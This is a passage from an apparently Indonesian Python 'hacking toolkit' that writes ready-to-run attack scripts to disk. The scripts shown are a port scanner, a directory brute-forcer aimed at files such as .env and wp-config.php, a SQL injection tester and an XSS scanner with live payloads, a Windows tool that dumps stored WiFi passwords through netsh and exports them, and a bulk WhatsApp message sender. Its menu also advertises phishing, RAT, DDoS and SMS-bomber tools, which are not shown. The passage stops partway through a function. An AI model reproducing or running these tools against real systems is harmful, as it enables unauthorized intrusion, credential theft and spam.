    print("1. Encrypt file")
    print("2. Decrypt file")
    print("3. Encrypt text")
    print("4. Decrypt text")
    
    choice = input("Choose [1-4]: ").strip()
    
    if choice == "1":
        file_path = input("File to encrypt: ").strip()
        if not os.path.exists(file_path):
            print("File not found!")
            return
        
        password = getpass.getpass("Password: ").strip()
        if not password:
            print("Password required!")
            return
        
        confirm = getpass.getpass("Confirm password: ").strip()
        if password != confirm:
            print("Passwords don't match!")
            return
        
        encrypt_file(file_path, password)
    
    elif choice == "2":
        file_path = input("File to decrypt (.encrypted): ").strip()
        if not os.path.exists(file_path):
            print("File not found!")
            return
        
        password = getpass.getpass("Password: ").strip()
        if not password:
            print("Password required!")
            return
        
        decrypt_file(file_path, password)
    
    elif choice == "3":
        encrypt_text()
    
    elif choice == "4":
        decrypt_text()
    
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()
'''
    
    filename = "encryption_tool.py"
    with open(filename, "w") as f:
        f.write(encrypt_script)
    
    print(colored(f"\n[Encryption Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("encrypt.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 8: EXPLOIT LOCAL - WORKING 100% ==================
def fitur_8():  
    os.system('clear'); print(colored("\n[8] EXPLOIT & SECURITY TOOLS", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Security Testing Tools]", 'yellow'))
    
    print(colored("\nSelect security tool:", 'cyan'))
    print(colored("   1. Port Scanner", 'white'))
    print(colored("   2. Directory Brute Forcer", 'white'))
    print(colored("   3. SQL Injection Tester", 'white'))
    print(colored("   4. XSS Vulnerability Scanner", 'white'))
    print(colored("   5. WiFi Tools (Windows)", 'white'))
    
    choice = input(colored("\nSelect [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        script = '''#!/usr/bin/env python3
# CYBER indonet Port Scanner
import socket, threading, time, sys

def scan_port(host, port, timeout=1):
    """Scan a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        result = sock.connect_ex((host, port))
        
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            print(f"[+] Port {port}/TCP open - {service}")
            return port
        else:
            return None
    
    except:
        return None

def scan_ports(host, start_port, end_port, max_threads=100):
    """Scan multiple ports"""
    print(f"[*] Scanning {host}...")
    print(f"[*] Ports: {start_port}-{end_port}")
    print(f"[*] Threads: {max_threads}")
    
    open_ports = []
    
    def worker(port):
        result = scan_port(host, port)
        if result:
            open_ports.append(result)
    
    threads = []
    for port in range(start_port, end_port + 1):
        while threading.active_count() > max_threads:
            time.sleep(0.01)
        
        thread = threading.Thread(target=worker, args=(port,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for all threads
    for thread in threads:
        thread.join()
    
    return open_ports

def main():
    print("Port Scanner")
    print("=" * 50)
    
    host = input("Target IP/hostname: ").strip()
    if not host:
        print("Target required!")
        return
    
    try:
        start_port = int(input("Start port (default 1): ").strip() or "1")
        end_port = int(input("End port (default 1024): ").strip() or "1024")
        threads = int(input("Threads (default 100): ").strip() or "100")
    except:
        print("Invalid input!")
        return
    
    print("[*] Starting scan...")
    start_time = time.time()
    
    open_ports = scan_ports(host, start_port, end_port, threads)
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\\n[*] Scan completed in {duration:.2f} seconds")
    print(f"[*] Open ports found: {len(open_ports)}")
    
    if open_ports:
        print("\\nOpen ports:")
        for port in sorted(open_ports):
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            print(f"  {port}/TCP - {service}")
    
    # Save results
    save = input("\\nSave results? (y/n): ").lower()
    if save == 'y':
        filename = f"port_scan_{host}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Port Scan Results\\n")
            f.write(f"Target: {host}\\n")
            f.write(f"Ports: {start_port}-{end_port}\\n")
            f.write(f"Time: {time.ctime()}\\n")
            f.write(f"Open ports: {len(open_ports)}\\n\\n")
            
            if open_ports:
                f.write("OPEN PORTS:\\n")
                for port in sorted(open_ports):
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    f.write(f"{port}/TCP - {service}\\n")
        
        print(f"[+] Results saved to {filename}")

if __name__ == "__main__":
    main()
'''
        
        filename = "port_scanner.py"
    
    elif choice == "2":
        script = '''#!/usr/bin/env python3
# CYBER indonet Directory Brute Forcer
import requests, threading, queue, sys, time, os

def check_directory(url, directory, timeout=5):
    """Check if directory exists"""
    full_url = url + directory if url.endswith('/') else url + '/' + directory
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=False)
        
        if response.status_code == 200:
            return full_url, response.status_code, len(response.content)
        elif response.status_code in [301, 302, 307, 308]:
            return full_url, response.status_code, "REDIRECT"
        elif response.status_code == 403:
            return full_url, response.status_code, "FORBIDDEN"
        elif response.status_code == 401:
            return full_url, response.status_code, "UNAUTHORIZED"
        else:
            return None
    
    except:
        return None

def worker(url, word_queue, results, timeout, delay):
    """Worker thread"""
    while not word_queue.empty():
        try:
            directory = word_queue.get_nowait()
            
            result = check_directory(url, directory, timeout)
            if result:
                results.append(result)
                full_url, status, info = result
                
                if status == 200:
                    print(f"[+] Found: {full_url} (200) - Size: {info}")
                elif status in [301, 302, 307, 308]:
                    print(f"[+] Found: {full_url} ({status}) - Redirect")
                elif status == 403:
                    print(f"[!] Found: {full_url} (403) - Forbidden")
                elif status == 401:
                    print(f"[!] Found: {full_url} (401) - Unauthorized")
            
            if delay > 0:
                time.sleep(delay)
            
            word_queue.task_done()
            
        except queue.Empty:
            break
        except:
            continue

def main():
    print("Directory Brute Forcer")
    print("=" * 50)
    
    url = input("Target URL (e.g., http://example.com/): ").strip()
    if not url:
        print("URL required!")
        return
    
    if not url.endswith('/'):
        url += '/'
    
    # Wordlist selection
    print("\\nWordlist options:")
    print("1. Use common directories")
    print("2. Use custom wordlist file")
    
    choice = input("Choose [1-2]: ").strip()
    
    if choice == "1":
        directories = [
            "admin", "login", "panel", "wp-admin", "dashboard",
            "backend", "adminpanel", "control", "manager", "system",
            "config", "phpmyadmin", "mysql", "database", "db",
            "backup", "backups", "old", "test", "dev",
            "api", "rest", "graphql", "oauth", "auth",
            "upload", "uploads", "files", "documents", "images",
            "include", "includes", "templates", "themes", "plugins",
            "vendor", "lib", "library", "src", "source",
            "tmp", "temp", "cache", "logs", "error",
            "info", "about", "contact", "help", "support",
            "shop", "store", "cart", "checkout", "payment",
            "secure", "security", "private", "protected", ".git",
            ".env", "config.php", "wp-config.php", "robots.txt",
            ".htaccess", ".htpasswd"
        ]
        print(f"Using {len(directories)} common directories")
    
    elif choice == "2":
        wordlist_path = input("Wordlist file path: ").strip()
        if not os.path.exists(wordlist_path):
            print("Wordlist file not found!")
            return
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                directories = [line.strip() for line in f if line.strip()]
            
            if not directories:
                print("Wordlist is empty!")
                return
            
            print(f"Loaded {len(directories)} directories")
        
        except Exception as e:
            print(f"Error: {e}")
            return
    
    else:
        print("Invalid choice!")
        return
    
    # Thread count
    try:
        threads = int(input("Threads (default 10): ").strip() or "10")
        timeout = int(input("Timeout (seconds, default 5): ").strip() or "5")
        delay = float(input("Delay between requests (seconds, default 0): ").strip() or "0")
    except:
        print("Invalid input!")
        return
    
    # Check target
    print(f"\\nChecking target: {url}")
    try:
        response = requests.get(url, timeout=10)
        print(f"Target responded: {response.status_code}")
    except:
        print("Warning: Target may not be reachable")
    
    # Start scan
    print(f"\\nStarting brute force...")
    print(f"Directories to check: {len(directories)}")
    
    start_time = time.time()
    
    word_queue = queue.Queue()
    for directory in directories:
        word_queue.put(directory)
    
    results = []
    thread_list = []
    
    for i in range(threads):
        thread = threading.Thread(
            target=worker,
            args=(url, word_queue, results, timeout, delay)
        )
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    
    # Wait for completion
    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        print("\\n[!] Scan interrupted")
    
    end_time = time.time()
    duration = end_time - start_time
    
    # Results
    print(f"\\n[*] Scan completed in {duration:.2f} seconds")
    print(f"[*] Found: {len(results)} interesting responses")
    
    if results:
        print("\\nFOUND:")
        for url, status, info in results:
            if status == 200:
                print(f"  [200] {url} - Size: {info}")
            elif status in [301, 302, 307, 308]:
                print(f"  [{status}] {url} - Redirect")
            elif status == 403:
                print(f"  [403] {url} - Forbidden")
            elif status == 401:
                print(f"  [401] {url} - Unauthorized")
    
    # Save results
    if results:
        save = input("\\nSave results? (y/n): ").lower()
        if save == 'y':
            import urllib.parse
            domain = urllib.parse.urlparse(url).netloc
            filename = f"dir_scan_{domain}_{int(time.time())}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"Directory Brute Force Results\\n")
                f.write(f"Target: {url}\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Directories checked: {len(directories)}\\n")
                f.write(f"Found: {len(results)}\\n\\n")
                
                f.write("RESULTS:\\n")
                for url, status, info in results:
                    f.write(f"{status} - {url}\\n")
            
            print(f"[+] Results saved to {filename}")

if __name__ == "__main__":
    main()
'''
        
        filename = "dir_bruteforcer.py"
    
    elif choice == "3":
        script = '''#!/usr/bin/env python3
# CYBER indonet SQL Injection Tester
import requests, time, urllib.parse

def test_sql_injection(url, param, payload):
    """Test for SQL injection"""
    # Build test URL
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if param in query_params:
        query_params[param] = [payload]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    else:
        separator = '&' if '&' in parsed.query else '?'
        test_url = f"{url}{separator}{param}={urllib.parse.quote(payload)}"
    
    # Send request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(test_url, headers=headers, timeout=10)
        
        # Check for SQL errors
        error_indicators = [
            'sql', 'SQL', 'mysql', 'MySQL', 'oracle', 'Oracle',
            'syntax', 'Syntax', 'error', 'Error', 'exception',
            'warning', 'undefined', 'unclosed', 'quotation',
            'near', 'at line', 'You have an error'
        ]
        
        page_content = response.text.lower()
        
        for indicator in error_indicators:
            if indicator.lower() in page_content:
                return True, indicator
        
        # Time-based blind SQLi
        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
            start_time = time.time()
            try:
                requests.get(test_url, headers=headers, timeout=30)
            except requests.exceptions.Timeout:
                pass
            end_time = time.time()
            
            if end_time - start_time > 5:
                return True, "Time-based delay detected"
    
    except requests.exceptions.Timeout:
        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
            return True, "Request timeout (possible blind SQLi)"
    except:
        pass
    
    return False, None

def main():
    print("SQL Injection Tester")
    print("=" * 50)
    
    url = input("Target URL (with parameters): ").strip()
    if not url:
        print("URL required!")
        return
    
    # Get parameters
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if query_params:
        print(f"\\nFound parameters: {', '.join(query_params.keys())}")
        use_existing = input("Test these parameters? (y/n): ").lower()
        
        if use_existing == 'y':
            parameters = list(query_params.keys())
        else:
            param_input = input("Parameters to test (comma separated): ").strip()
            parameters = [p.strip() for p in param_input.split(',')] if param_input else []
    else:
        print("\\nNo parameters found in URL.")
        param_input = input("Parameters to test (comma separated): ").strip()
        parameters = [p.strip() for p in param_input.split(',')] if param_input else []
    
    if not parameters:
        print("No parameters specified!")
        return
    
    # SQL payloads
    payloads = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' UNION SELECT NULL --",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' OR SLEEP(5) --",
        "' OR IF(1=1,SLEEP(5),0) --",
        "admin' --",
        "1' OR '1'='1",
    ]
    
    print(f"\\n[*] Testing {len(parameters)} parameters with {len(payloads)} payloads")
    
    vulnerabilities = []
    
    for param in parameters:
        print(f"\\n[*] Testing parameter: {param}")
        
        for payload in payloads:
            vulnerable, reason = test_sql_injection(url, param, payload)
            
            if vulnerable:
                print(f"[!] Vulnerable: {payload[:50]}... - {reason}")
                vulnerabilities.append({
                    'parameter': param,
                    'payload': payload,
                    'reason': reason
                })
                break  # Stop after first successful test for this parameter
    
    # Results
    print(f"\\n[*] Scan completed")
    print(f"[*] Vulnerabilities found: {len(vulnerabilities)}")
    
    if vulnerabilities:
        print("\\nVULNERABILITIES:")
        for vuln in vulnerabilities:
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Reason: {vuln['reason']}")
            print()
    
    # Save results
    if vulnerabilities:
        save = input("Save results? (y/n): ").lower()
        if save == 'y':
            domain = parsed.netloc
            filename = f"sqli_test_{domain}_{int(time.time())}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"SQL Injection Test Results\\n")
                f.write(f"Target: {url}\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Vulnerabilities: {len(vulnerabilities)}\\n\\n")
                
                f.write("VULNERABILITIES:\\n")
                for vuln in vulnerabilities:
                    f.write(f"Parameter: {vuln['parameter']}\\n")
                    f.write(f"Payload: {vuln['payload']}\\n")
                    f.write(f"Reason: {vuln['reason']}\\n")
                    f.write(f"{'-'*30}\\n")
            
            print(f"[+] Results saved to {filename}")

if __name__ == "__main__":
    main()
'''
        
        filename = "sql_injection_tester.py"
    
    elif choice == "4":
        script = '''#!/usr/bin/env python3
# CYBER indonet XSS Scanner
import requests, urllib.parse

def test_xss(url, param, payload):
    """Test for XSS vulnerability"""
    # Build test URL
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if param in query_params:
        query_params[param] = [payload]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    else:
        separator = '&' if '&' in parsed.query else '?'
        test_url = f"{url}{separator}{param}={urllib.parse.quote(payload)}"
    
    # Send request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(test_url, headers=headers, timeout=10)
        
        # Check if payload appears in response
        if payload in response.text:
            return True, "Reflected XSS"
        
        # Check for encoded payload
        decoded_payload = urllib.parse.unquote(payload)
        if decoded_payload in response.text:
            return True, "Reflected XSS (encoded)"
    
    except:
        pass
    
    return False, None

def main():
    print("XSS Scanner")
    print("=" * 50)
    
    url = input("Target URL: ").strip()
    if not url:
        print("URL required!")
        return
    
    # Get parameters
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    if query_params:
        print(f"\\nFound parameters: {', '.join(query_params.keys())}")
        use_existing = input("Test these parameters? (y/n): ").lower()
        
        if use_existing == 'y':
            parameters = list(query_params.keys())
        else:
            param_input = input("Parameters to test (comma separated): ").strip()
            parameters = [p.strip() for p in param_input.split(',')] if param_input else []
    else:
        print("\\nNo parameters found in URL.")
        param_input = input("Parameters to test (comma separated): ").strip()
        parameters = [p.strip() for p in param_input.split(',')] if param_input else []
    
    if not parameters:
        print("No parameters specified!")
        return
    
    # XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\" onmouseover=\"alert('XSS')\"",
        "' onmouseover=\"alert('XSS')\"",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]
    
    print(f"\\n[*] Testing {len(parameters)} parameters with {len(payloads)} payloads")
    
    vulnerabilities = []
    
    for param in parameters:
        print(f"\\n[*] Testing parameter: {param}")
        
        for payload in payloads:
            vulnerable, reason = test_xss(url, param, payload)
            
            if vulnerable:
                print(f"[!] Vulnerable: {payload[:50]}... - {reason}")
                vulnerabilities.append({
                    'parameter': param,
                    'payload': payload,
                    'reason': reason
                })
                break  # Stop after first successful test
    
    # Results
    print(f"\\n[*] Scan completed")
    print(f"[*] Vulnerabilities found: {len(vulnerabilities)}")
    
    if vulnerabilities:
        print("\\nVULNERABILITIES:")
        for vuln in vulnerabilities:
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Reason: {vuln['reason']}")
            print()
    
    # Save results
    if vulnerabilities:
        save = input("Save results? (y/n): ").lower()
        if save == 'y':
            domain = parsed.netloc
            filename = f"xss_test_{domain}_{int(time.time())}.txt"
            
            with open(filename, 'w') as f:
                f.write(f"XSS Test Results\\n")
                f.write(f"Target: {url}\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Vulnerabilities: {len(vulnerabilities)}\\n\\n")
                
                f.write("VULNERABILITIES:\\n")
                for vuln in vulnerabilities:
                    f.write(f"Parameter: {vuln['parameter']}\\n")
                    f.write(f"Payload: {vuln['payload']}\\n")
                    f.write(f"Reason: {vuln['reason']}\\n")
                    f.write(f"{'-'*30}\\n")
            
            print(f"[+] Results saved to {filename}")

if __name__ == "__main__":
    main()
'''
        
        filename = "xss_scanner.py"
    
    elif choice == "5":
        script = '''#!/usr/bin/env python3
# CYBER indonet WiFi Tools (Windows)
import subprocess, re, json, os, sys

def get_wifi_profiles():
    """Get WiFi profiles"""
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode != 0:
            print("Error: Could not get WiFi profiles")
            return []
        
        profiles = []
        lines = result.stdout.split('\\n')
        
        for line in lines:
            if 'All User Profile' in line:
                match = re.search(r':(.+)', line)
                if match:
                    profile_name = match.group(1).strip()
                    profiles.append(profile_name)
        
        return profiles
    
    except Exception as e:
        print(f"Error: {e}")
        return []

def get_wifi_password(profile_name):
    """Get password for WiFi profile"""
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profile', f'name="{profile_name}"', 'key=clear'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode != 0:
            return None, "Command failed"
        
        lines = result.stdout.split('\\n')
        password = None
        
        for line in lines:
            if 'Key Content' in line:
                match = re.search(r':(.+)', line)
                if match:
                    password = match.group(1).strip()
                    break
        
        return password, None
    
    except Exception as e:
        return None, f"Error: {e}"

def main():
    print("WiFi Tools (Windows)")
    print("=" * 50)
    
    # Check if Windows
    if sys.platform != 'win32':
        print("Error: This tool only works on Windows!")
        return
    
    # Check admin
    print("[*] Checking ...")
    try:
        test_file = 'C:\\\\Windows\\\\Temp\\\\test.tmp'
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        print("[+] Running with administrator")
    except:
        print("[-] Not running as administrator")
        print("    Some profiles may not be accessible")
    
    # Get profiles
    print("\\n[*] Getting WiFi profiles...")
    profiles = get_wifi_profiles()
    
    if not profiles:
        print("No WiFi profiles found!")
        return
    
    print(f"[+] Found {len(profiles)} profile(s)")
    
    # Get passwords
    print("\\n[*] Retrieving passwords...")
    print("-" * 50)
    
    wifi_data = []
    found_passwords = 0
    
    for profile in profiles:
        print(f"Processing: {profile}")
        
        password, error = get_wifi_password(profile)
        
        if error:
            print(f"  Error: {error}")
            wifi_data.append({
                'profile': profile,
                'password': None,
                'error': error
            })
        elif password:
            print(f"  Password: {password}")
            wifi_data.append({
                'profile': profile,
                'password': password,
                'error': None
            })
            found_passwords += 1
        else:
            print(f"  Password: Not stored")
            wifi_data.append({
                'profile': profile,
                'password': None,
                'error': 'Not stored'
            })
    
    # Results
    print(f"\\n[*] Summary:")
    print(f"  Profiles: {len(profiles)}")
    print(f"  Passwords retrieved: {found_passwords}")
    
    if found_passwords > 0:
        print("\\nWiFi Passwords:")
        for item in wifi_data:
            if item['password']:
                print(f"  SSID: {item['profile']}")
                print(f"  Password: {item['password']}")
                print()
    
    # Export
    export = input("\\nExport results? (y/n): ").lower()
    if export == 'y':
        filename = "wifi_passwords.json"
        with open(filename, 'w') as f:
            json.dump(wifi_data, f, indent=2)
        print(f"[+] Saved to {filename}")
    
    print("\\n[!] Security Note:")
    print("    • These are passwords stored on YOUR computer")
    print("    • Do not share this information")
    print("    • Use responsibly")

if __name__ == "__main__":
    main()
'''
        
        filename = "wifi_tools.py"
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    with open(filename, "w") as f:
        f.write(script)
    
    print(colored(f"\n[Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("exploit.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 9: UNDANGAN WA LOCAL - WORKING 100% ==================
def fitur_9():  
    os.system('clear'); print(colored("\n[9] WHATSAPP GROUP INVITE", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - WhatsApp Tools]", 'yellow'))
    
    wa_script = '''#!/usr/bin/env python3
# CYBER indonet WhatsApp Tools
import webbrowser, pyperclip, time, os, sys, urllib.parse

def send_whatsapp_invite(phone_numbers, group_link, message=""):
    """Generate WhatsApp invite links"""
    if isinstance(phone_numbers, str):
        phone_numbers = [phone_numbers]
    
    results = []
    
    for phone in phone_numbers:
        # Clean phone number
        phone_clean = ''.join(filter(str.isdigit, phone))
        
        if phone_clean.startswith('0'):
            phone_clean = '62' + phone_clean[1:]
        elif phone_clean.startswith('+62'):
            phone_clean = phone_clean[1:]
        elif phone_clean.startswith('62'):
            pass
        else:
            phone_clean = '62' + phone_clean
        
        # Create message
        if message:
            encoded_message = f"Halo! Saya mengundang Anda untuk bergabung dengan grup WhatsApp ini:\\n{group_link}\\n\\n{message}"
        else:
            encoded_message = f"Halo! Saya mengundang Anda untuk bergabung dengan grup WhatsApp ini:\\n{group_link}"
        
        encoded_message = urllib.parse.quote(encoded_message)
        
        whatsapp_url = f"https://web.whatsapp.com/send?phone={phone_clean}&text={encoded_message}"
        
        results.append({
            'phone': phone,
            'phone_clean': phone_clean,
            'url': whatsapp_url
        })
    
    return results

def main():
    print("WhatsApp Tools")
    print("=" * 50)
    
    print("Options:")
    print("1. Send group invite")
    print("2. Send message to number")
    print("3. Bulk message sender")
    
    choice = input("Choose [1-3]: ").strip()
    
    if choice == "1":
        group_link = input("\\nWhatsApp group invite link: ").strip()
        if not group_link:
            print("Group link required!")
            return
        
        phone = input("Phone number (+62...): ").strip()
        if not phone:
            print("Phone number required!")
            return
        
        custom_message = input("Custom message (optional): ").strip()
        
        results = send_whatsapp_invite([phone], group_link, custom_message)
        
        print(f"\\n[+] Generated link:")
        print(f"   {results[0]['url']}")
        
        open_browser = input("\\nOpen in browser? (y/n): ").lower()
        if open_browser == 'y':
            webbrowser.open(results[0]['url'])
            print("Link opened in browser")
    
    elif choice == "2":
        phone = input("\\nPhone number (+62...): ").strip()
        if not phone:
            print("Phone number required!")
            return
        
        message = input("Message: ").strip()
        if not message:
            print("Message required!")
            return
        
        encoded_message = urllib.parse.quote(message)
        phone_clean = ''.join(filter(str.isdigit, phone))
        
        if phone_clean.startswith('0'):
            phone_clean = '62' + phone_clean[1:]
        
        whatsapp_url = f"https://web.whatsapp.com/send?phone={phone_clean}&text={encoded_message}"
        
        print(f"\\n[+] Generated link:")
        print(f"   {whatsapp_url}")
        
        open_browser = input("\\nOpen in browser? (y/n): ").lower()
        if open_browser == 'y':
            webbrowser.open(whatsapp_url)
            print("Link opened in browser")
    
    elif choice == "3":
        print("\\nBulk message sender")
        print("Note: This requires a list of phone numbers")
        
        numbers_file = input("File with phone numbers (one per line): ").strip()
        if not os.path.exists(numbers_file):
            print("File not found!")
            return
        
        try:
            with open(numbers_file, 'r') as f:
                numbers = [line.strip() for line in f if line.strip()]
            
            if not numbers:
                print("No phone numbers found!")
                return
            
            print(f"\\nLoaded {len(numbers)} phone numbers")
            
            message = input("Message to send: ").strip()
            if not message:
                print("Message required!")
                return
            
            encoded_message = urllib.parse.quote(message)
            
            links = []
            for phone in numbers:
                phone_clean = ''.join(filter(str.isdigit, phone))
                
                if phone_clean.startswith('0'):
                    phone_clean = '62' + phone_clean[1:]
                elif phone_clean.startswith('+62'):
                    phone_clean = phone_clean[1:]
                
                whatsapp_url = f"https://web.whatsapp.com/send?phone={phone_clean}&text={encoded_message}"
                links.append(whatsapp_url)
            
            # Save links to file
            filename = f"whatsapp_links_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                for link in links:
                    f.write(link + '\\n')
            
            print(f"\\n[+] Generated {len(links)} links")
            print(f"[+] Saved to {filename}")
            
            print("\\nTo use:")
            print("1. Open WhatsApp Web")
            print("2. Open each link to send message")
            print("3. Wait for each message to send before next")
            
        except Exception as e:
            print(f"Error: {e}")
    
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    # Check dependencies
    try:
        import webbrowser
    except:
        print("Error: webbrowser module not available")
        sys.exit(1)
    
    try:
        import pyperclip
    except:
        pyperclip = None
        print("Note: pyperclip not installed")
        print("Install: pip install pyperclip for clipboard features")
    
    main()
'''
    
    filename = "whatsapp_tools.py"
    with open(filename, "w") as f:
        f.write(wa_script)
    
    print(colored(f"\n[WhatsApp Tools Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    save_result("whatsapp.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 10: DASHBOARD MONITORING ==================
def fitur_10():  
    os.system('clear'); print(colored("\n[10] SYSTEM DASHBOARD", 'cyan', attrs=['bold']))
    print(colored("   [Status]", 'yellow'))
    
    print(colored("\nSystem Information:", 'cyan'))
    print(colored(f"   • User: CYBER_LEADER", 'white'))
    print(colored(f"   • Time: {CURRENT_TIME}", 'white'))
    print(colored(f"   • Country: {COUNTRY}", 'white'))
    print(colored(f"   • Python: {sys.version.split()[0]}", 'white'))
    print(colored(f"   • Platform: {sys.platform}", 'white'))
    
    # Dependencies status
    print(colored("\nDependencies:", 'cyan'))
    deps_status = [
        ("Selenium", SELENIUM_AVAILABLE, "Web automation"),
        ("Cryptography", CRYPTO_AVAILABLE, "Encryption"),
        ("Pillow", PILLOW_AVAILABLE, "Image tools"),
    ]
    
    for name, available, desc in deps_status:
        if available:
            print(colored(f"   • {name}: ✓ Installed - {desc}", 'green'))
        else:
            print(colored(f"   • {name}: ✗ Missing - {desc}", 'red'))
    
    # Results directory
    if os.path.exists(RESULTS_DIR):
        files = os.listdir(RESULTS_DIR)
        print(colored(f"\nResults Directory: {RESULTS_DIR}", 'cyan'))
        print(colored(f"   • Files: {len(files)}", 'white'))
        if files:
            latest = max(files, key=lambda f: os.path.getctime(os.path.join(RESULTS_DIR, f)))
            print(colored(f"   • Latest: {latest}", 'white'))
    
    # Available tools
    print(colored("\nAvailable Tools:", 'cyan'))
    tools = [
        "1. Phishing Generator",
        "2. RAT & Remote Access",
        "3. DDoS Attack Tool",
        "4. SMS Bomber",
        "5. OSINT Investigation",
        "6. Image Manipulation",
        "7. File Encryption",
        "8. Security Testing",
        "9. WhatsApp Tools",
        "14. Phone Number Info",
        "15. TikTok Tools"
    ]
    
    for tool in tools:
        print(colored(f"   • {tool}", 'white'))
    
    # Quick actions
    print(colored("\nQuick Actions:", 'cyan'))
    print(colored("   1. Install missing dependencies", 'white'))
    print(colored("   2. View results folder", 'white'))
    print(colored("   3. Update script", 'white'))
    print(colored("   4. Back to menu", 'white'))
    
    action = input(colored("\nSelect action [1-4]: ", 'yellow')).strip()
    
    if action == "1":
        print(colored("\nInstalling dependencies...", 'cyan'))
        missing = []
        if not SELENIUM_AVAILABLE:
            missing.append("selenium")
        if not CRYPTO_AVAILABLE:
            missing.append("cryptography")
        if not PILLOW_AVAILABLE:
            missing.append("pillow")
        
        if missing:
            for package in missing:
                print(colored(f"   Installing {package}...", 'white'))
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                    print(colored(f"   ✓ {package} installed", 'green'))
                except:
                    print(colored(f"   ✗ Failed to install {package}", 'red'))
        else:
            print(colored("   All dependencies are installed!", 'green'))
    
    elif action == "2":
        if os.path.exists(RESULTS_DIR):
            files = os.listdir(RESULTS_DIR)
            if files:
                print(colored(f"\nFiles in {RESULTS_DIR}:", 'cyan'))
                for file in files[:10]:
                    size = os.path.getsize(os.path.join(RESULTS_DIR, file))
                    print(colored(f"   • {file} ({size} bytes)", 'white'))
                if len(files) > 10:
                    print(colored(f"   ... and {len(files) - 10} more", 'yellow'))
            else:
                print(colored("   No files yet", 'white'))
        else:
            print(colored("   Results directory not found", 'red'))
    
    elif action == "3":
        check_for_updates()
    
    input("\nPress Enter to continue...")

# ================== FITUR 14: PHONE NUMBER INFO LOCAL - WORKING 100% ==================
def fitur_14():  
    os.system('clear'); print(colored("\n[14] PHONE NUMBER INFORMATION", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Phone Number Lookup]", 'yellow'))
    
    phone = input(colored("Phone Number (+62...): ", 'yellow')).strip()
    
    if not phone:
        print(colored("[ERROR] Phone number required!", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[ANALYZING] {phone}", 'green', attrs=['bold']))
    
    # Clean phone number
    import re
    clean_phone = re.sub(r'[^0-9]', '', phone)
    
    if clean_phone.startswith('0'):
